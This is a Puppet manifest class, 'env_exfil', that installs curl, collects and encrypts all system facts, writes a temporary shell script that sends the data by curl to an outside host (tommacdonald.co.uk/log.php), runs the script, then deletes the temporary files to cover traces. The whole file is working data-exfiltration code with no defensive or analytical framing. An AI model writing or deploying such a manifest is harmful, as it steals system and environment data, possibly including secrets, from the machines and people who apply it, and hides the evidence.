class env_exfil {

  package { 'curl':
    ensure => installed,
  }

  # Encrypt environment variables before sending
  exec { 'encrypt_env_vars':
    command => env_exfil::encrypt_aes(join(values($facts), "&")),
    path    => ['/usr/bin', '/bin'],
  }

  # Create a temporary bash script to exfil the env vars.
  file { '/tmp/send_encrypted_env.sh':
    ensure  => file,
    mode    => '0755',
    content => "#!/bin/sh\ncurl -X GET 'https://tommacdonald.co.uk/log.php?data='$(cat /tmp/encrypted_data.txt | tr -d '\n')",
    require => Exec['encrypt_env_vars'],
  }

  # Run the script to send the encrypted environment variables
  exec { 'send_encrypted_env':
    command => '/bin/sh /tmp/send_encrypted_env.sh',
    path    => ['/usr/bin', '/bin'],
    timeout => 30,
    require => File['/tmp/send_encrypted_env.sh'],
  }

  # Cleanup encrypted file after transmission
  exec { 'cleanup_encrypted_env':
    command => 'rm -f /tmp/encrypted_data.txt /tmp/send_encrypted_env.sh',
    path    => ['/usr/bin', '/bin'],
    require => Exec['send_encrypted_env'],
  }
}
